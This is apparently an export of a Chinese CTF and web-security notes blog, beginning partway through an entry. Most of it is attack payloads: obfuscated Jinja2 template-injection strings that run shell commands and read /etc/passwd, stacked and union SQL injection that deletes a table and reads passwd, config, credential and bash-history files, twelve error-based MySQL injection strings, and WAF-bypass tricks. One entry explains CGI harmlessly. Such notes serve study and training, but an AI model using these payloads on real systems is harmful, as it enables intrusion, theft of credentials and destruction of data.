<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(&apos;__c&apos;+&apos;lass__&apos;).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__class__.__base__.__subclasses__()[131].__init__.__globals__[&apos;__builtins__&apos;][&apos;ev&apos;+&apos;al&apos;](&apos;__im&apos;+&apos;port__(&quot;o&apos;+&apos;s&quot;).po&apos;+&apos;pen(&quot;cat /this_is_the_fl&apos;+&apos;ag.txt&quot;)&apos;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;&apos;&apos;.__class__.__base__.__subclasses__()[77].__init__.__globals__[&apos;sys&apos;].modules[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;po&apos;+&apos;pen&apos;](&apos;cat /this_is_the_fl&apos;+&apos;ag.txt&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>堆叠注入</title>
    <url>/2020/03/17/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<blockquote>
<p>在PHP中，<code>mysqli_multi_query()</code>函数可以多语句查询SQL </p>
</blockquote><h4 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h4><blockquote>
<p>​    在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products; 服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products;当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 </p>
</blockquote>]]></content>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2020/03/17/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<blockquote>
<ul>
<li>对表名为纯数字的表进行操作时，要在前后加上`符号。</li>
<li>对列名进行更改时，要在后面指定修改后的数据类型  </li>
<li>盲注时候多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</li>
</ul>
</blockquote><a id="more"></a>
<h1 id="load-file-的使用"><a href="#load-file-的使用" class="headerlink" title="load_file()的使用"></a>load_file()的使用</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 要有file_priv权限</span><br><span class="line"><span class="number">2.</span> 知道文件绝对路径</span><br><span class="line"><span class="number">3.</span> 对web目录有读权限  </span><br><span class="line">注：若过滤了单引号，则可以将函数中的字符进行hex编码</span><br></pre></td></tr></table></figure>

<h2 id="一般步骤"><a href="#一般步骤" class="headerlink" title="一般步骤"></a>一般步骤</h2><p>读/etc/init.d下的东西，这里有配置文件路径</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">'/etc/init.d/httpd'</span>)</span><br></pre></td></tr></table></figure>

<p>得到web安装路径</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">'/etc/apache/conf/httpd.conf'</span>)</span><br></pre></td></tr></table></figure>

<p>读取密码文件</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>' <span class="class"><span class="keyword">union</span> <span class="title">select</span></span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="symbol">'var</span>/www/html/xxx.com/php/conn.inc.php')</span><br></pre></td></tr></table></figure>

<p>  读取系统中所有的用户和用户的主要信息 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1&apos; union select 1,2,load_file(&apos;/etc/passwd&apos;)</span><br></pre></td></tr></table></figure>

<p>查看用户的history</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Bash shell在“~/.bash_history”（“~/”表示用户目录）文件中保存了500条使用过的命令，这样能使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1&apos; union select 1,2,load_file(&apos;~/.bash_history&apos;)     （“~/”表示用户目录）</span><br></pre></td></tr></table></figure>

<h1 id="sql注入12个报错方式"><a href="#sql注入12个报错方式" class="headerlink" title="sql注入12个报错方式"></a><strong>sql注入12个报错方式</strong></h1><p><a href="https://www.bugku.com/forum.php?mod=viewthread&tid=93&extra=page%3D1%26filter%3Dtypeid%26typeid%3D26" target="_blank" rel="noopener">sql注入12个报错方式</a></p>
<blockquote>
<p>1、通过floor报错,注入语句如下:<br>and select 1 from (select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);</p>
<p>2、通过ExtractValue报错,注入语句如下:<br>and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p>
<p>3、通过UpdateXml报错,注入语句如下:<br>and 1=(updatexml(1,concat(0x3a,(select user())),1))</p>
<p>4、通过NAME_CONST报错,注入语句如下:<br>and exists(select<em>from (select</em>from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</p>
<p>5、通过join报错,注入语句如下:<br>select * from(select * from mysql.user ajoin mysql.user b)c;</p>
<p>6、通过exp报错,注入语句如下:<br>and exp(~(select * from (select user () ) a) );</p>
<p>7、通过GeometryCollection()报错,注入语句如下:<br>and GeometryCollection(()select *from(select user () )a)b );</p>
<p>8、通过polygon ()报错,注入语句如下:<br>and polygon (()select * from(select user ())a)b );</p>
<p>9、通过multipoint ()报错,注入语句如下:<br>and multipoint (()select * from(select user() )a)b );</p>
<p>10、通过multlinestring ()报错,注入语句如下:<br>and multlinestring (()select * from(selectuser () )a)b );</p>
<p>11、通过multpolygon ()报错,注入语句如下:<br>and multpolygon (()select * from(selectuser () )a)b );</p>
<p>12、通过linestring ()报错,注入语句如下:<br>and linestring (()select * from(select user() )a)b );</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>CGI模式</title>
    <url>/2020/03/17/CGI%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>[简单说明CGI和动态请求是什么 ] (<a href="https://www.cnblogs.com/f-ck-need-u/p/7627035.html" target="_blank" rel="noopener">https://www.cnblogs.com/f-ck-need-u/p/7627035.html</a>)</p><blockquote>
<p>CGI是common gateway interface的缩写，大家都译作通用网关接口 </p>
<p>这个规则会将header中的proxy参数设置为环境变量HTTP_PROXY </p>
</blockquote><a id="more"></a>

<h3 id="CGI介绍"><a href="#CGI介绍" class="headerlink" title="CGI介绍"></a>CGI介绍</h3><p>​    总所周知，web服务器所处理的任务都是静态的，假如其要想处理动态的任务，则需要web应用程序的帮助，比如PHP，jsp，python，perl等为了将web服务器的动态请求传递给这些应用程序，依靠cgi协议。</p>
<p> 简单的cgi工作方式： </p>
<p><img src="/2020/03/17/CGI%E6%A8%A1%E5%BC%8F/CGI%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F.png" alt></p>
<blockquote>
<p> 有多种方式可以执行cgi程序，但对http的请求方法来说，只有get和post两种方法允许执行cgi脚本(即上面的search程序)。实际上post方法的内部本质还是get方法，只不过在发送http请求时，get和post方法对url中的参数处理方式不一样而已。 </p>
</blockquote>
<p> 通过cgi协议，再结合已搭建好的web应用程序，就可以让web server也能”处理”动态请求(或者说，当用户访问某个特定资源时，可以触发执行某个web应用程序来实现特定功能) ,例如，在谷歌搜索栏中搜索一个关键词”http”，对应的URL为： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.google.com/search?q=http&amp;oq=http&amp;aqs=chrome..69i57j69i60l4j0.1136j0j8&amp;sourceid=chrome&amp;ie=UTF-8</span><br></pre></td></tr></table></figure>

<p>当谷歌的web server收到该请求后，先分析该url，从中知道了要执行search程序，并且还知道了一系列要传递给search的参数及其对应的value。web server会将这些程序参数和其它一些环境变量根据cgi协议通过TCP或套接字等方式传递给已启动的cgi程序(可能是cgi进程，或者是已加载的模块cgi模块)。当cgi进程接收到web server的请求后，调用search程序并执行，同时还会传递参数给search程序。search执行结束后，cgi进程/线程将处理结果返回给web server，web server再返回给浏览器。</p>
<p>任何一种语言都能编写CGI，只不过有些语言比较擅长，有些语言则非常繁琐，例如用bash shell开发，那么需要用echo等打印语句将执行结果放在巨多无比的html的标签中输出给客户端。常用于编写CGI的语言有perl、php、python等，java也一样能写，但java的servlet完全能实现CGI的功能，且更优化、更利于开发。</p>
<h3 id="各种术语释疑"><a href="#各种术语释疑" class="headerlink" title="各种术语释疑"></a>各种术语释疑</h3><p> 刚接触cgi概念的时候肯定会有一堆疑问，这到底是什么鬼，处理动态内容的东西不是像php一样的应用程序吗 ？</p>
<p>以php为例，我将一次动态请求相关的概念大致都简单解释一遍。</p>
<ol>
<li><code>cgi</code>：它是一种协议。通过cgi协议，web server可以将动态请求和相关参数发送给专门处理动态内容的应用程序。</li>
<li><code>fastcgi</code>：也是一种协议，只不过是cgi的优化版。cgi的性能较烂，fastcgi则在其基础上进行了改进。</li>
<li><code>php-cgi</code>：fastcgi是一种协议，而php-cgi实现了这种协议。不过这种实现比较烂。它是单进程的，一个进程处理一个请求，处理结束后进程就销毁。</li>
<li><code>php-fmp</code>：是对php-cgi的改进版，它直接管理多个php-cgi进程/线程。也就是说，<strong>php-fpm是php-cgi的进程管理器</strong>因此它也算是fastcgi协议的实现。在一定程度上讲，php-fpm与php的关系，和tomcat对java的关系是类似的。</li>
<li><code>cgi进程/线程</code>：在php上，就是php-cgi进程/线程。专门用于接收web server的动态请求，<strong>调用并初始化zend虚拟机</strong>。</li>
<li><code>cgi脚本</code>：被执行的php源代码文件。</li>
<li><code>zend虚拟机</code>：对php文件做词法分析、语法分析、编译成opcode，并执行。最后关闭zend虚拟机。</li>
<li><code>cgi进程/线程和zend虚拟机的关系</code>：cgi进程调用并初始化zend虚拟机的各种环境。</li>
</ol>
<p>以php-fpm为例，web server从转发动态请求到结束的过程大致如下：</p>
<p>![](CGI模式/web server从转发动态请求到结束过程.png)</p>
<h3 id="web-server和CGI的交互模式"><a href="#web-server和CGI的交互模式" class="headerlink" title="web server和CGI的交互模式"></a>web server和CGI的交互模式</h3><p>​    web server对cgi进程/线程来说，它的作用就是发起动态处理请求，传递一些参数和环境变量，最后接收cgi的返回结果。再通俗而不严谨地说，web server通过cgi/fastcgi协议将动态请求转发给执行cgi脚本的应用程序。通过下面httpd.conf中的转发配置应该很容易理解(httpd和php-fpm的交互)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ProxyRequests off</span><br><span class="line">ProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:9000/usr/local/apache/htdocs/$1</span><br></pre></td></tr></table></figure>

<p>以最典型的apache httpd和php为例，对于httpd来说，web server和php-cgi有3种交互模式。</p>
<ul>
<li><code>cgi模式</code>：httpd接收到一个动态请求就fork一个cgi进程，cgi进程返回结果给httpd进程后自我销毁。</li>
<li><code>动态模块模式</code>：将php-cgi的模块(例如php5_module)编译进httpd。在httpd启动时会加载模块，加载时也将对应的模块激活，php-cgi也就启动了。(注：纠正一个小小错误，很多人以为动态编译的模块是可以在需要的时候随时加载调用，不需要的时候它们就停止了，实际上不是这样的。和静态编译的模块一样，动态加载的模块在被加载时就被加入到激活链表中，无论是否使用它，它都已经运行在apache httpd的内部。可参考LoadModule指令的官方手册)</li>
<li><code>php-fpm模式</code>：使用php-fpm管理php-cgi，此时httpd不再控制php-cgi进程的启动。可以将php-fpm独立运行在非web服务器上，实现所谓的动静分离。</li>
</ul>
<p>实际上，借助模块mod_fastcgi还可以实现fastcgi模式。同cgi一样，管理模式的先天缺陷决定了这并不是一种好方法。</p>
]]></content>
  </entry>
  <entry>
    <title>笔记</title>
    <url>/2019/12/14/%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="PHP字符串解析漏洞"><a href="#PHP字符串解析漏洞" class="headerlink" title="PHP字符串解析漏洞"></a>PHP字符串解析漏洞</h1><p><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></p><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/news.php?%20news[id%00=42&quot;+AND+1=0–</span><br></pre></td></tr></table></figure>

<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
<blockquote>
<p>1.删除空白符</p>
</blockquote>
<blockquote>
<p>2.将某些字符转换为下划线（包括空格）</p>
</blockquote>
<p>我的理解：<br>假如waf不允许num变量传递字母：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话</span><br></pre></td></tr></table></figure>

<p>那么我们可以在num前加个空格：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/index.php? num = aaaa</span><br></pre></td></tr></table></figure>

<p>这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
<h1 id="php别名"><a href="#php别名" class="headerlink" title="php别名"></a>php别名</h1><blockquote>
<p>php2, php3, php4, php5, phps, pht, phtm, phtml </p>
</blockquote>
<h1 id="CVE-2018-12613漏洞"><a href="#CVE-2018-12613漏洞" class="headerlink" title="CVE-2018-12613漏洞"></a>CVE-2018-12613漏洞</h1><blockquote>
<p>这个漏洞利用了一个性值：如果将 ？双重编码，经过包含时会把你包含的文件当作一个目录，也就是说，如果你写入：</p>
<p>hint.php%25%3F（%25%3F是?的二次编码）</p>
<p>那么解析时会把hint.php当作一个目录来看。</p>
</blockquote>
<h1 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h1><blockquote>
<p>利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。<br>所以当我们用ᴬdmin注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成Admin，我们用ᴬdmin进行登录，可以看到index页面的username变成了Admin，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可。 </p>
</blockquote>
<h1 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$GLOBALS</span><br></pre></td></tr></table></figure>

<h1 id="GIT恢复"><a href="#GIT恢复" class="headerlink" title="GIT恢复"></a>GIT恢复</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log --reflog     </span><br><span class="line">git reset --hard  xxxxxxxxxxxxx           (版本号)</span><br></pre></td></tr></table></figure>

<p>先git log –reflog查看一下 可疑文件 然后在恢复他</p>
<h1 id="JSON转义字符绕过"><a href="#JSON转义字符绕过" class="headerlink" title="JSON转义字符绕过"></a>JSON转义字符绕过</h1><p> json使支持unicode编码的，所以可以用unicode代替关键字 </p>
<p> <code>\uXXXX</code>可以在JSON中转义字符，例如<code>A</code>，<code>\u0041</code>等效 </p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
</search>
